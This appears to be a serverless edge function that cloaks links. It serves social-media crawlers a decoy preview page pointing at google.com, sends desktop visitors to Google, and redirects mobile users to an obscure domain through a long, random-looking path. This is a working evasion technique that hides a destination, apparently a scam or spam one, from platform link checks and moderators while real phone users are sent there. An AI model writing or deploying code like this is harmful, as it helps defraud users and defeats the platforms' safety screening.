export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Thu-Sep-17-2026/bac73b16-cd74-47f4-9c9d-60f7a67b1076/602054ad-733c-4b02-8b2a-dcd4287eab63.tiff">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/dSgG7D/ddRLp3OU54Wa/lBTSWrQwl_Yhxbx_/1CYBj4/9xAhbh/isoG-njgsu/vVLH8Ti4/hyvYW4ZCTkOboZ3noTnJ/HqDWIi1/L5X354VGH/hJx8vu/A8QOq3GD2/57buhXnaEbGhON", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
